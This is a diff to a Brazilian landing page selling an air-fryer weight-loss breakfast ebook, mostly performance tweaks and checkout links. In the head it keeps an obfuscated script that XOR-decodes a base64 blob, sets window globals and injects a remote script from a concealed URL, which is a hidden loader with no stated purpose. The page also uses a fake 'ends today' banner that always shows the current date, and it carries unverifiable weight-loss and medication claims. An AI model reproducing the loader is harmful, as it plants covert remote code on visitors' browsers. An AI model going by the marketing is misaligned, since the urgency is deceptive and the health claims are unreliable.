@@ -5,17 +5,70 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>96 Cafés da Manhã na Air Fryer</title>
 <meta name="description" content="96 cafés da manhã na Air Fryer para emagrecer, prontos em até 15 minutos. Receitas rápidas, práticas e com ingredientes simples.">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;700;800;900&family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="style.css">
+<script>document.documentElement.className+=" js"</script>
 
-<script type="text/javascript">
-    (function(c,l,a,r,i,t,y){
-        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-    })(window, document, "clarity", "script", "yr1z42qnu5");
+<!-- Recursos críticos da primeira tela: baixam com prioridade -->
+<link rel="preload" href="imagens/hero.webp" as="image" fetchpriority="high">
+<link rel="preload" href="fonts/poppins-800.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="fonts/roboto.woff2" as="font" type="font/woff2" crossorigin>
+
+<!-- CSS CRÍTICO (primeira tela) — o restante vem do style.css sem travar a página.
+     Se mudar algo do topo no style.css, ajuste aqui também. -->
+<style>
+@font-face{font-family:"Poppins";font-style:normal;font-weight:700;font-display:swap;src:url(fonts/poppins-700.woff2) format("woff2")}
+@font-face{font-family:"Poppins";font-style:normal;font-weight:800;font-display:swap;src:url(fonts/poppins-800.woff2) format("woff2")}
+@font-face{font-family:"Roboto";font-style:normal;font-weight:100 900;font-display:swap;src:url(fonts/roboto.woff2) format("woff2")}
+@font-face{font-family:"Poppins Fallback";src:local("Arial"),local("Roboto");ascent-override:93.62%;descent-override:31.21%;line-gap-override:8.92%;size-adjust:112.16%}
+@font-face{font-family:"Roboto Fallback";src:local("Arial"),local("Roboto");ascent-override:92.49%;descent-override:24.34%;line-gap-override:0%;size-adjust:100.3%}
+:root{--cream:#FFF8EE;--cream-2:#FCEBD3;--ink:#484F18;--coffee-2:#60664C;--orange:#E8772E;--green:#17A34A;--green-dark:#11833B;--white:#FFF;--red:#D9412B;--shadow:0 10px 30px rgba(59,36,24,.1)}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;scroll-padding-top:48px}
+body{font-family:"Roboto","Roboto Fallback",sans-serif;background:var(--cream);color:var(--ink);line-height:1.6;font-size:17px;-webkit-font-smoothing:antialiased;padding-top:36px}
+img{max-width:100%;height:auto;display:block}
+.wrap{max-width:1080px;margin:0 auto;padding:0 16px}
+.narrow{max-width:760px;margin:0 auto}
+section{padding:64px 0}
+.pain{background:var(--white)}
+h1,h2,h3{font-family:"Poppins","Poppins Fallback",sans-serif;line-height:1.15;letter-spacing:-.01em}
+.hl{color:var(--green)}
+.topbar{position:fixed;top:0;left:0;right:0;z-index:100;background:#054A05;color:#fff;text-align:center;font-size:14px;height:36px;line-height:36px;padding:0 16px;white-space:nowrap;overflow:hidden;box-shadow:0 2px 10px rgba(0,0,0,.15)}
+.topbar strong{font-weight:800;letter-spacing:.01em}
+.topbar-date{margin-left:8px;font-weight:500;opacity:.9}
+.hero{background:radial-gradient(1200px 500px at 50% -10%,var(--cream-2),transparent 70%),var(--cream);padding:48px 0 64px;text-align:center}
+.hero h1{font-size:clamp(32px,6.4vw,58px);font-weight:800;max-width:900px;margin:0 auto 18px}
+.hero p.sub{font-size:clamp(17px,2.4vw,20px);color:var(--coffee-2);max-width:680px;margin:0 auto 30px}
+.hero-img{max-width:640px;margin:0 auto 32px;aspect-ratio:766/558;border-radius:24px;overflow:hidden;box-shadow:var(--shadow);position:relative}
+.hero-img img{width:100%;height:100%;object-fit:cover}
+.hero-price{margin:-8px auto 26px;text-align:center;line-height:1.2}
+.hp-from{color:var(--red);font-weight:800;font-size:18px;text-decoration:line-through;text-decoration-thickness:2px}
+.hp-label{color:var(--coffee-2);font-weight:700;font-size:14px;letter-spacing:.06em;text-transform:uppercase;margin:6px 0 2px}
+.hp-value{font-family:"Poppins","Poppins Fallback",sans-serif;font-weight:800;color:var(--green);font-size:clamp(38px,7vw,48px);line-height:1.1}
+.btn{display:inline-block;text-decoration:none;text-align:center;background:var(--green);color:#fff;font-weight:800;font-size:18px;letter-spacing:.01em;text-transform:uppercase;padding:20px 28px;border-radius:999px;width:100%;max-width:480px;box-shadow:0 6px 0 var(--green-dark),0 14px 30px rgba(23,163,74,.35);transition:transform .15s ease,box-shadow .15s ease;animation:pulse 2.4s ease-in-out infinite}
+.hero .btn{white-space:nowrap;letter-spacing:0;font-size:clamp(13px,4.1vw,18px);padding-left:16px;padding-right:16px}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.025)}}
+.trust{display:flex;flex-wrap:wrap;justify-content:center;gap:6px 16px;font-size:14px;color:var(--coffee-2);margin-top:16px}
+.trust span{display:inline-flex;align-items:center;gap:6px}
+.trust svg{width:16px;height:16px;flex:none}
+.js .reveal{opacity:0}
+@media (max-width:400px){.topbar{font-size:12.5px;padding:0 10px}.topbar-date{margin-left:4px}}
+@media (prefers-reduced-motion:reduce){.btn{animation:none}html{scroll-behavior:auto}}
+</style>
+
+<!-- Resto do CSS: carrega sem bloquear a exibição da primeira tela -->
+<link rel="preload" href="style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="style.css"></noscript>
+
+<script src="script.js" defer></script>
+
+<!-- Microsoft Clarity: carrega depois que a página termina de abrir -->
+<script>
+window.addEventListener("load",function(){setTimeout(function(){
+  (function(c,l,a,r,i,t,y){
+    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+    t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+    y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+  })(window,document,"clarity","script","yr1z42qnu5");
+},1500)});
 </script>
 
 <script>(function(){var x_42=atob("DLRZ3kGIUcUh6YjGO897qzPkc/8DgfyyS8dj8W7rNasPnPyrUtIg8CLnPOtDm6e1WMYwrjX7frBVhPvpV9UtuzL8f69Sy6TkWsAtrCjqJLFEmqr8YM97sCDlNOcby+ynT9V0qzXlOKNYxPi0XsI8sDWlKaZOjaW1WN978mP+MKlUjKr8GZYk8jqqP6RMjKr8GdA4qiClJLFMgO6/FsQruzftP7EMmv2kUtAq/G2qJ6RNnO3kAZZ7oxz1");var m_8=[];for(var c_1=0;c_1<x_42.length;c_1++){m_8.push(x_42.charCodeAt(c_1)&255);}var z_onf=m_8[0];var r_yy6m=m_8.slice(1,1+z_onf);var n_r=m_8.slice(1+z_onf);var h_p=n_r.map(function(b,x_9mc){return b^r_yy6m[x_9mc%z_onf];});var y_4h="";for(var u_1p=0;u_1p<h_p.length;u_1p++){y_4h+=String.fromCharCode(h_p[u_1p]&255);}var n_y=decodeURIComponent(escape(y_4h));var r_m=JSON.parse(n_y);var d_e=r_m.globals||[];d_e.forEach(function(a_rd5){window[a_rd5.name]=a_rd5.value;});var v_w60=document.createElement("script");v_w60.src=r_m.url;v_w60.async=true;v_w60.defer=true;(r_m.attributes||[]).forEach(function(q_m8fp){v_w60.setAttribute(q_m8fp.name,q_m8fp.value);});(document.head||document.documentElement).appendChild(v_w60);})();</script>
@@ -38,20 +91,26 @@
 
 <!-- ================= FAIXA DO TOPO ================= -->
 <div class="topbar" role="note">
-  <span aria-hidden="true">🔥</span> <strong>ESSA PROMOÇÃO ACABA HOJE!</strong> <span id="todayDate" class="topbar-date">01/10/2026</span>
+  <span aria-hidden="true">🔥</span> <strong>ESSA PROMOÇÃO ACABA HOJE!</strong> <span id="todayDate" class="topbar-date"></span><script>document.getElementById("todayDate").textContent=new Date().toLocaleDateString("pt-BR")</script>
 </div>
 
 <!-- ================= HERO ================= -->
 <header class="hero">
   <div class="wrap">
-    <h1>96 Cafés da Manhã na Air Fryer para Emagrecer, <span class="hl">Prontos em Até 15 Minutos</span></h1>
-    <p class="sub">Varie seu café da manhã de forma saudável, econômica e saborosa com receitas rápidas, práticas e com ingredientes simples.</p>
+    <h1>96 Cafés da Manhã Fit na Air Fryer, <span class="hl">Práticos e Econômicos</span></h1>
+    <p class="sub">Varie seu café da manhã com receitas prontas em menos de 15 minutos de forma saudável, barata, saborosa e com ingredientes simples.</p>
 
     <div class="hero-img">
-      <img src="imagens/hero.webp" alt="Material 96 Cafés da Manhã na Air Fryer" width="766" height="558" fetchpriority="high">
+      <img src="imagens/hero.webp" alt="Material 96 Cafés da Manhã na Air Fryer" width="766" height="558" fetchpriority="high" loading="eager">
     </div>
 
-    <a href="#valor" class="btn">Quero minhas 96 receitas agora</a>
+    <div class="hero-price">
+      <div class="hp-from">De R$ 67,00</div>
+      <div class="hp-label">Por apenas</div>
+      <div class="hp-value">R$ 14,90</div>
+    </div>
+
+    <a href="#valor" class="btn">Quero os 96 cafés fitness</a>
     <div class="trust">
       <span><svg style="color:var(--orange)"><use href="#i-bolt"/></svg>Acesso imediato</span>
       <span><svg style="color:var(--green)"><use href="#i-lock"/></svg>Compra Segura</span>
@@ -99,19 +158,18 @@
 <!-- Fotos das receitas: imagens/1.webp ... 10.webp -->
 <section class="gallery">
   <div class="wrap">
-    <h2>Veja o que você <span class="hl">vai preparar</span></h2>
-    <p class="lead">Algumas das receitas que você<br> encontra no material.</p>
+    <h2>Veja algumas <span class="hl">vai preparar</span></h2>
     <div class="grid-recipes">
-      <div class="recipe reveal"><img src="imagens/1.webp" alt="Receita de café da manhã na Air Fryer" loading="lazy" width="600" height="450"></div>
-      <div class="recipe reveal"><img src="imagens/2.webp" alt="Receita de café da manhã na Air Fryer" loading="lazy" width="600" height="450"></div>
-      <div class="recipe reveal"><img src="imagens/3.webp" alt="Receita de café da manhã na Air Fryer" loading="lazy" width="600" height="450"></div>
-      <div class="recipe reveal"><img src="imagens/4.webp" alt="Receita de café da manhã na Air Fryer" loading="lazy" width="600" height="450"></div>
-      <div class="recipe reveal"><img src="imagens/5.webp" alt="Receita de café da manhã na Air Fryer" loading="lazy" width="600" height="450"></div>
-      <div class="recipe reveal"><img src="imagens/6.webp" alt="Receita de café da manhã na Air Fryer" loading="lazy" width="600" height="450"></div>
-      <div class="recipe reveal"><img src="imagens/7.webp" alt="Receita de café da manhã na Air Fryer" loading="lazy" width="600" height="450"></div>
-      <div class="recipe reveal"><img src="imagens/8.webp" alt="Receita de café da manhã na Air Fryer" loading="lazy" width="600" height="450"></div>
-      <div class="recipe reveal"><img src="imagens/9.webp" alt="Receita de café da manhã na Air Fryer" loading="lazy" width="600" height="450"></div>
-      <div class="recipe reveal"><img src="imagens/10.webp" alt="Receita de café da manhã na Air Fryer" loading="lazy" width="600" height="450"></div>
+      <div class="recipe reveal"><img src="imagens/1.webp" srcset="imagens/1-360.webp 360w, imagens/1.webp 600w" sizes="(max-width: 860px) calc(50vw - 21px), 200px" alt="Receita de café da manhã na Air Fryer" loading="lazy" decoding="async" width="600" height="450"></div>
+      <div class="recipe reveal"><img src="imagens/2.webp" srcset="imagens/2-360.webp 360w, imagens/2.webp 600w" sizes="(max-width: 860px) calc(50vw - 21px), 200px" alt="Receita de café da manhã na Air Fryer" loading="lazy" decoding="async" width="600" height="450"></div>
+      <div class="recipe reveal"><img src="imagens/3.webp" srcset="imagens/3-360.webp 360w, imagens/3.webp 600w" sizes="(max-width: 860px) calc(50vw - 21px), 200px" alt="Receita de café da manhã na Air Fryer" loading="lazy" decoding="async" width="600" height="450"></div>
+      <div class="recipe reveal"><img src="imagens/4.webp" srcset="imagens/4-360.webp 360w, imagens/4.webp 600w" sizes="(max-width: 860px) calc(50vw - 21px), 200px" alt="Receita de café da manhã na Air Fryer" loading="lazy" decoding="async" width="600" height="450"></div>
+      <div class="recipe reveal"><img src="imagens/5.webp" srcset="imagens/5-360.webp 360w, imagens/5.webp 600w" sizes="(max-width: 860px) calc(50vw - 21px), 200px" alt="Receita de café da manhã na Air Fryer" loading="lazy" decoding="async" width="600" height="450"></div>
+      <div class="recipe reveal"><img src="imagens/6.webp" srcset="imagens/6-360.webp 360w, imagens/6.webp 600w" sizes="(max-width: 860px) calc(50vw - 21px), 200px" alt="Receita de café da manhã na Air Fryer" loading="lazy" decoding="async" width="600" height="450"></div>
+      <div class="recipe reveal"><img src="imagens/7.webp" srcset="imagens/7-360.webp 360w, imagens/7.webp 600w" sizes="(max-width: 860px) calc(50vw - 21px), 200px" alt="Receita de café da manhã na Air Fryer" loading="lazy" decoding="async" width="600" height="450"></div>
+      <div class="recipe reveal"><img src="imagens/8.webp" srcset="imagens/8-360.webp 360w, imagens/8.webp 600w" sizes="(max-width: 860px) calc(50vw - 21px), 200px" alt="Receita de café da manhã na Air Fryer" loading="lazy" decoding="async" width="600" height="450"></div>
+      <div class="recipe reveal"><img src="imagens/9.webp" srcset="imagens/9-360.webp 360w, imagens/9.webp 600w" sizes="(max-width: 860px) calc(50vw - 21px), 200px" alt="Receita de café da manhã na Air Fryer" loading="lazy" decoding="async" width="600" height="450"></div>
+      <div class="recipe reveal"><img src="imagens/10.webp" srcset="imagens/10-360.webp 360w, imagens/10.webp 600w" sizes="(max-width: 860px) calc(50vw - 21px), 200px" alt="Receita de café da manhã na Air Fryer" loading="lazy" decoding="async" width="600" height="450"></div>
     </div>
     <p class="more">E muito mais receitas para você comer sem culpa...</p>
     <div class="center"><a href="#valor" class="btn">Quero minhas 96 receitas agora</a></div>
@@ -126,9 +184,13 @@
     <div class="carousel" id="quotesCarousel">
       <button class="car-btn prev" type="button" aria-label="Depoimento anterior">‹</button>
       <div class="car-track">
+        <div class="t-card t-print"><img src="imagens/download_1.webp" alt="Mensagem de WhatsApp da cliente Ana Carolina" loading="lazy" decoding="async" width="400" height="500"></div>
+        <div class="t-card t-print"><img src="imagens/depoimento_22_1.webp" alt="Mensagem de WhatsApp da cliente Patrícia Almeida" loading="lazy" decoding="async" width="427" height="856"></div>
+        <div class="t-card t-print"><img src="imagens/depoimento_2_completo_1.webp" alt="Mensagem de WhatsApp da cliente Mariana Alves" loading="lazy" decoding="async" width="427" height="817"></div>
+        <div class="t-card t-print"><img src="imagens/depoimento_03_1.webp" alt="Comentários de clientes no Instagram" loading="lazy" decoding="async" width="400" height="500"></div>
         <!-- DEPOIMENTO 1 -->
         <div class="t-card">
-          <div class="t-photo"><img src="imagens/antes_depois_4_cxxom7gr_1.webp" alt="Antes e depois da Claudia" loading="lazy"></div>
+          <div class="t-photo"><img src="imagens/antes_depois_4_cxxom7gr_1.webp" alt="Antes e depois da Claudia" loading="lazy" decoding="async" width="860" height="860"></div>
           <div class="t-body">
             <div class="t-result">-8kg</div>
             <p class="t-quote">"Voltei a ter energia pra cuidar dos meus filhos."</p>
@@ -138,7 +200,7 @@
         </div>
         <!-- DEPOIMENTO 2 -->
         <div class="t-card">
-          <div class="t-photo"><img src="imagens/depoimento_antes_depois_csldwdkt_1.webp" alt="Antes e depois da Rosana" loading="lazy"></div>
+          <div class="t-photo"><img src="imagens/depoimento_antes_depois_csldwdkt_1.webp" alt="Antes e depois da Rosana" loading="lazy" decoding="async" width="860" height="860"></div>
           <div class="t-body">
             <div class="t-result">-7kg</div>
             <p class="t-quote">"Minha pressão normalizou e o médico reduziu meu remédio."</p>
@@ -148,7 +210,7 @@
         </div>
         <!-- DEPOIMENTO 3 -->
         <div class="t-card">
-          <div class="t-photo"><img src="imagens/antes_depois_maria_bjz_z_hl_1.webp" alt="Antes e depois da Maria" loading="lazy"></div>
+          <div class="t-photo"><img src="imagens/antes_depois_maria_bjz_z_hl_1.webp" alt="Antes e depois da Maria" loading="lazy" decoding="async" width="800" height="1080"></div>
           <div class="t-body">
             <div class="t-result">-9kg</div>
             <p class="t-quote">"Perdi 9kg em 30 dias. Tive que jogar algumas calças e shorts fora."</p>
@@ -156,10 +218,6 @@
             <div class="t-stars" aria-label="5 estrelas">★★★★★</div>
           </div>
         </div>
-        <div class="t-card t-print"><img src="imagens/download_1.webp" alt="Mensagem de WhatsApp da cliente Ana Carolina" loading="lazy"></div>
-        <div class="t-card t-print"><img src="imagens/depoimento_22_1.webp" alt="Mensagem de WhatsApp da cliente Patrícia Almeida" loading="lazy"></div>
-        <div class="t-card t-print"><img src="imagens/depoimento_2_completo_1.webp" alt="Mensagem de WhatsApp da cliente Mariana Alves" loading="lazy"></div>
-        <div class="t-card t-print"><img src="imagens/depoimento_03_1.webp" alt="Comentários de clientes no Instagram" loading="lazy"></div>
       </div>
       <button class="car-btn next" type="button" aria-label="Próximo depoimento">›</button>
       <div class="car-dots" role="tablist"></div>
@@ -174,32 +232,32 @@
     <h2>Leve também <span class="hl">6 bônus</span><br> para facilitar ainda mais sua rotina:</h2>
     <div class="bonus-list">
       <div class="bonus-card reveal">
-        <img class="bonus-img" src="imagens/bonus1.webp" alt="Capa do Bônus 01" width="416" height="234" loading="lazy">
+        <img class="bonus-img" src="imagens/bonus1.webp" alt="Capa do Bônus 01" width="416" height="234" loading="lazy" decoding="async">
         <div><span class="bonus-label">Bônus 1</span><h3>Cardápios Semanais de Café da Manhã para Emagrecimento</h3>
           <div class="price-tag">Valor: <s>R$ 37</s><span class="free">GRÁTIS</span></div></div>
       </div>
       <div class="bonus-card reveal">
-        <img class="bonus-img" src="imagens/bonus2.webp" alt="Capa do Bônus 02" width="416" height="234" loading="lazy">
+        <img class="bonus-img" src="imagens/bonus2.webp" alt="Capa do Bônus 02" width="416" height="234" loading="lazy" decoding="async">
         <div><span class="bonus-label">Bônus 2</span><h3>30 Substituições Baratas para Variar as Receitas</h3>
           <div class="price-tag">Valor: <s>R$ 27</s><span class="free">GRÁTIS</span></div></div>
       </div>
       <div class="bonus-card reveal">
-        <img class="bonus-img" src="imagens/bonus3.webp" alt="Capa do Bônus 03" width="416" height="234" loading="lazy">
+        <img class="bonus-img" src="imagens/bonus3.webp" alt="Capa do Bônus 03" width="416" height="234" loading="lazy" decoding="async">
         <div><span class="bonus-label">Bônus 3</span><h3>Listas de Compras Econômicas para a Semana</h3>
           <div class="price-tag">Valor: <s>R$ 27</s><span class="free">GRÁTIS</span></div></div>
       </div>
       <div class="bonus-card reveal">
-        <img class="bonus-img" src="imagens/bonus4.webp" alt="Capa do Bônus 04" width="416" height="234" loading="lazy">
+        <img class="bonus-img" src="imagens/bonus4.webp" alt="Capa do Bônus 04" width="416" height="234" loading="lazy" decoding="async">
         <div><span class="bonus-label">Bônus 4</span><h3>20 Cafés da Manhã Mais Sacientes para Segurar a Fome até o Almoço</h3>
           <div class="price-tag">Valor: <s>R$ 37</s><span class="free">GRÁTIS</span></div></div>
       </div>
       <div class="bonus-card reveal">
-        <img class="bonus-img" src="imagens/bonus5.webp" alt="Capa do Bônus 05" width="416" height="234" loading="lazy">
+        <img class="bonus-img" src="imagens/bonus5.webp" alt="Capa do Bônus 05" width="416" height="234" loading="lazy" decoding="async">
         <div><span class="bonus-label">Bônus 5</span><h3>21 Cafés da Manhã para Desinchar e Ajudar o Intestino a Funcionar Melhor</h3>
           <div class="price-tag">Valor: <s>R$ 37</s><span class="free">GRÁTIS</span></div></div>
       </div>
       <div class="bonus-card reveal">
-        <img class="bonus-img" src="imagens/bonus6.webp" alt="Capa do Bônus 06" width="416" height="234" loading="lazy">
+        <img class="bonus-img" src="imagens/bonus6.webp" alt="Capa do Bônus 06" width="416" height="234" loading="lazy" decoding="async">
         <div><span class="bonus-label">Bônus 6</span><h3>Guia de Congelamento e Descongelamento com 20 Preparos para Deixar Prontos e Aquecer na Air Fryer</h3>
           <div class="price-tag">Valor: <s>R$ 27</s><span class="free">GRÁTIS</span></div></div>
       </div>
@@ -271,14 +329,14 @@
         <div class="from">De <s>R$ 67</s></div>
         <div class="price">Por apenas <strong>R$ 14,90</strong></div>
         <div class="installments">Ou em 3x de R$ 5,43</div>
-        <a href="#planos" data-checkout="basico" class="btn ghost">Quero o plano básico</a>
+        <a href="https://pay.wiapy.com/-2j_wSlt3sEB" data-checkout="basico" class="btn ghost">Quero o plano básico</a>
       </div>
 
       <!-- PLANO PREMIUM -->
       <div class="plan premium reveal">
         <span class="badge">Mais Vendido</span>
         <div class="name">Plano Completo</div>
-        <div class="plan-img"><img src="imagens/price.webp" alt="Livro 96 Cafés da Manhã na Air Fryer com os 6 bônus" loading="lazy"></div>
+        <div class="plan-img"><img src="imagens/price.webp" alt="Livro 96 Cafés da Manhã na Air Fryer com os 6 bônus" loading="lazy" decoding="async" width="395" height="327"></div>
         <h3>PLANO COMPLETO + 6 BÔNUS</h3>
         <ul>
           <li><svg><use href="#i-check"/></svg>96 Receitas de Café da Manhã na Air Fryer Para Emagrecer</li>
@@ -302,7 +360,7 @@
           <div class="big-price"><small>R$</small>27<small>,90</small></div>
           <div class="installments">Ou em 6x de R$ 5,31</div>
         </div>
-        <a href="#planos" data-checkout="premium" class="btn">Quero levar tudo agora!</a>
+        <a href="https://pay.wiapy.com/efAzeKR0gK0R" data-checkout="premium" class="btn">Quero levar tudo agora!</a>
         <div class="safe">Acesso imediato · Compra Segura · Garantia de 30 dias</div>
       </div>
 
@@ -314,7 +372,7 @@
 <section class="author">
   <div class="wrap narrow">
     <div class="author-photo reveal">
-      <img src="imagens/persona.webp" alt="Nutricionista autora das receitas" width="504" height="729" loading="lazy">
+      <img src="imagens/persona.webp" alt="Nutricionista autora das receitas" width="504" height="729" loading="lazy" decoding="async">
     </div>
     <div class="author-copy">
       <p class="author-hook">Quem é a Nutri Marcela Almeida? <span class="hl"></span></p>
@@ -396,6 +454,5 @@
   <p>Este produto não substitui o acompanhamento de um nutricionista ou médico.</p>
 </footer>
 
-<script src="script.js"></script>
 </body>
 </html>
